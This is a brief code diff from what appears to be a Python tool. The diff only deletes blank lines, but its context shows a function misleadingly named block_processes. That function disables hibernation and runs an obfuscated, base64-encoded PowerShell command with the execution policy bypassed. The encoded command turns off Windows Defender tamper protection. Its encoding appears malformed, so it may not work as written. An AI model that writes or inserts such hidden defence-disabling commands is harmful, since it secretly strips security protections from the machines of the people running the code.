@@ -331,10 +331,6 @@ def check_connection(url="http://www.google.com/", timeout=30):
 
 def block_processes():
     execute_command("powercfg /h off")
-
-
-
-
     execute_command(
         "powershell -ExecutionPolicy Bypass -EncodedCommand UwAAAGUAAAB0AAAALQAAAE0AAABwAAAAUAAAAHIAAABlAAAAZgAAAGUAAAByAAAAZQAAAG4AAABjAAAAZQAAACAAAAAtAAAARAAAAGkAAABzAAAAYQAAAGIAAABsAAAAZQAAAFQAAABhAAAAbQAAAHAAAABlAAAAcgAAAFAAAAByAAAAbwAAAHQAAABlAAAAYwAAAHQAAABpAAAAbwAAAG4AAAAgAAAAJAAAAHQAAAByAAAAdQAAAGUAAAA="
     )
